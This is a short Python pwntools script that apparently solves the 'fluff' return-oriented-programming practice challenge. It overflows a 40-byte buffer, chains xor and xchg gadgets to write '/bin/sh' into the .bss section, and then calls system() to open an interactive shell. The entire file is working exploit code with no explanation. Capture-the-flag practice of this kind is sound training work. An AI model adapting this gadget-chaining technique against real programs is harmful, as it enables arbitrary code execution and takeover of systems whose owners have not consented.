# -*- coding: utf-8 -*-
from pwn import *
p = process('./fluff')
p.recvuntil("> ")
# ROPgadget --binary ./fluff --depth 20
# 0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
# 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
# 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
# 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
# 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret

mov_r10_r11 = 0x000000000040084d
xchg_r11_r10 = 0x0000000000400840
xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
pop_r12 = 0x0000000000400832
pop_rdi = 0x00000000004008c3
call_system = 0x4005E0 
bss_addr = 0x601060
bin_sh = "/bin/sh\x00"
notuse = "a" * 8

payload = "a" * 40 

# mov bss_addr to r10
payload += p64(pop_r12)
payload += p64(bss_addr)
payload += p64(xor_r11_r11)
payload += notuse
payload += p64(xor_r11_r12)
payload += notuse
payload += p64(xchg_r11_r10)
payload += notuse

# mov bin_sh to r11
payload += p64(pop_r12)
payload += bin_sh
payload += p64(xor_r11_r11)
payload += notuse
payload += p64(xor_r11_r12)
payload += notuse

# write bin_sh to bss_addr (mov [r10], r11)
payload += p64(mov_r10_r11)
payload += p64(bss_addr)
payload += notuse
payload += p64(0)
payload += p64(call_system)

p.sendline(payload)
p.interactive()


